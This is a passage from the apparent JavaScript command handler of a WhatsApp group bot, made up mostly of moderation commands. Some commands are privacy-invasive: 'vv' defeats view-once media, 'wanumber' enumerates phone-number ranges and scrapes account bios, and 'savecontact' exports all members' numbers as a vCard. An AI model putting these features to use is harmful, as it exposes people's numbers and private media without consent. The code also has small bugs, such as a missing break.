		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await EliteProEmpire.updateBlockStatus(users, 'block')
		await reply(`Done`)
	}
	break
	case 'unblock': case 'unban': {
		if (!XeonTheCreator) return reply("This command is only made for my owner.")
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await EliteProEmpire.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break
            case 'bcgc':
            case 'bcgroup': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await EliteProEmpire.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    EliteProEmpire.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                reply(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + fs.readFileSync("ElitePro.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   reply(`${getCase(q)}`)
                } catch {
                  reply(`case ${q} not found!`)
                }
            break
            //group
            case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].badword = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].badword = false
                  reply(`${commad} is disabled`)
               }
               }
            break
            case 'react': {
                if (!XeonTheCreator) return reply("This command is only made for my owner.")
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                EliteProEmpire.sendMessage(m.chat, reactionMessage)
            }
            break
           case 'nsfw': {
if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
if (args[0] === "on") {
if (AntiNsfw) return reply('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
reply('Success in turning on nsfw in this group')
var groupe = await EliteProEmpire.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
EliteProEmpire.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return reply('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
reply('Success in turning off nsfw in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            reply(from)
           }
          break
            case 'antiaudio':{
            	if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiaudio = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiaudio = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antiforeign':{
            	if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[m.chat].antiforeignnum = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].antiforeignnum = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'poll': {
	if (!XeonTheCreator) return reply("This command is only made for my owner.")
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await reply(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Chinedu-MD,ElitePro,Cyrilix-MD...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await EliteProEmpire.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'antipoll':{
            	if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antipoll = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipoll = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antisticker = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antisticker = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiimage = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiimage = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivideo = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivideo = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antivirtex':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivirtex = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivirtex = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  reply(`${command} is disabled`)
               }
               }
case 'elite-open':
case 'vv': {
  try {
    if (!m.quoted) return reply(`Reply to an viewonce`);
    
    let quotedMessage = m.quoted;
    let messageType = quotedMessage.mtype;
    
    if (messageType === 'imageMessage') {
      let imageCaption = quotedMessage.text || '';
      let media = await quotedMessage.download();
      return EliteProEmpire.sendMessage(m.chat, { image: media, caption: imageCaption });
    }
    else if (messageType === 'videoMessage') {
      let videoCaption = quotedMessage.text || '';
      let media = await quotedMessage.download();
      return EliteProEmpire.sendMessage(m.chat, { video: media, caption: videoCaption });
    }
    
    return reply(`❌ Unsupported media type. Only images and videos are supported.`);
  } catch (error) {
    console.error("Error in 'elite-open' or 'vv' command handling:", error);
    return reply(`❌ An error occurred while processing your request. Please try again later.`);
  }
}
break
            case 'antiviewonce':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiviewonce = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiviewonce = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antispam':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antispam = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antispam = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antimedia = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antimedia = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antidocument = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidocument = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].anticontact = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].anticontact = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilocation = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilocation = false
                  reply(`${command} is disabled`)
               }
               }
            break
            case 'antilink': {
               if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  reply(`${command} is disabled`)
               }
            }
            break
            case 'antilinkgc': {
               if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  reply(`${command} is disabled`)
               }
            }
            break
            case 'antipromotion': {
               if (!m.isGroup) return reply("This command is for group use only.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antipromotion = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipromotion = false
                  reply(`${command} is disabled`)
               }
            }
            break
            case 'welcome':
            case 'goodbye': {
               if (!m.isGroup) return reply("This command is for group use only.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  welcome = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  welcome = false
                  reply(`${command} is disabled`)
               }
            }
            break
            case 'adminevent': {
               if (!m.isGroup) return reply("This command is for group use only.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  adminevent = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  adminevent = false
                  reply(`${command} is disabled`)
               }
            }
            break
case 'groupevent': {
               if (!m.isGroup) return reply("This command is for group use only.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  groupevent = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  groupevent = false
                  reply(`${command} is disabled`)
               }
            }
            break 
            case 'invite': {
	if (!m.isGroup) return reply("This command is for group use only.")
	if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!text) return reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2348109263390`)
if (text.includes('+')) return reply(`Enter the number together without *+*`)
if (isNaN(text)) return reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await EliteProEmpire.groupInviteCode(group)
      await EliteProEmpire.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply(` An invite link is sent to the user`) 
}
break
            case 'closetime':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                reply(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    EliteProEmpire.groupSettingUpdate(m.chat, 'announcement')
                    reply(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !XeonTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                reply(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    EliteProEmpire.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                break
            case 'kick':
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await EliteProEmpire.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                reply(mess.done)
                break

                case "idgroup": case "groupid": {
if (!XeonTheCreator) return reply("This command is only made for my owner.")
let getGroups = await EliteProEmpire.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await EliteProEmpire.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await EliteProEmpire.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await EliteProEmpire.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return reply("This command is for group use only.")
if (!(isGroupAdmins || XeonTheCreator)) return reply("This command is made for admins.")
xeonbigpp = await EliteProEmpire.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
EliteProEmpire.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
}
break
case 'savecontact': case 'svcontact': case 'vcf':{
if (!m.isGroup) return reply("This command is for group use only.")
if (!(isGroupAdmins || XeonTheCreator)) return reply("This command is made for admins.")
let cmiggc = await EliteProEmpire.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
EliteProEmpire.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'Group: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return reply("This command is for group use only.")
if (!m.mentionedJid[0]) return reply('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
EliteProEmpire.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return reply("This command is for group use only.")
if (!(isGroupAdmins || XeonTheCreator)) return reply("This command is made for admins.")
if (!m.mentionedJid[0]) return reply('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
EliteProEmpire.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return reply("This command is for group use only.")
                if(!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await EliteProEmpire.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                reply(mess.done)
                break
            case 'promote':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await EliteProEmpire.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                reply(mess.done)
                break
            case 'demote':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await EliteProEmpire.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                reply(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (!text) return reply('Text ?')
                await EliteProEmpire.groupUpdateSubject(m.chat, text)
                reply(mess.done)
                break
                case 'userjid':{
          	if(!XeonTheCreator) return reply("This command is only made for my owner.")
        const groupMetadata = m.isGroup ? await EliteProEmpire.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      reply(textt)
    }
    break
    case 'creategc': case 'creategroup': {
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await EliteProEmpire.groupCreate(args.join(" "), [])
let response = await EliteProEmpire.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
EliteProEmpire.sendMessage(m.chat, { text:teksop, mentions: await EliteProEmpire.parseMention(teksop)}, {quoted:m})
} catch {
	reply(`Error`)
	}
}
break
    case 'setbotbio':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (!text) return reply(`Where is the text?\nExample: ${prefix + command} ElitePro`)
    await EliteProEmpire.updateProfileStatus(text)
    reply(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply("This command is for group use only.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
if (!isBotAdmins) return reply("Bot needs admin privileges.")
    await EliteProEmpire.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!XeonTheCreator) return reply("This command is only made for my owner.")
    await EliteProEmpire.removeProfilePicture(EliteProEmpire.user.id)
    reply(`Success in deleting bot's profile picture`)
    }
    break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (!text) return reply('Text ?')
                await EliteProEmpire.groupUpdateDescription(m.chat, text)
                reply(mess.done)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins) return reply(mess.admin)
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await EliteProEmpire.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await EliteProEmpire.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await EliteProEmpire.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
            case 'tagall':
            case 'tag':
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
let me = m.sender
let teks = `🫠 *ELITE-PRO-V2 TAGGED YOU*\n
✨ *Message:* ${q ? q : 'no message'}
> *You were tagged by the admin.*${readmore}\n═════✪〘 *TAG ALL* 〙✪═════\n➲ *Author:*  @${me.split('@')[0]}\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]},`
                }
                EliteProEmpire.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'kickall': {
 if (!m.isGroup) return reply("This command is for group use only.")
 if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
 if (!isBotAdmins) return reply("Bot needs admin privileges.")
  const xeonkickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of xeonkickall) {
 await EliteProEmpire.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 reply(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return reply("This command is for group use only.")
 if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply("This command is made for admins.")
 if (!isBotAdmins) return reply("Bot needs admin privileges.")
  const xeonpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
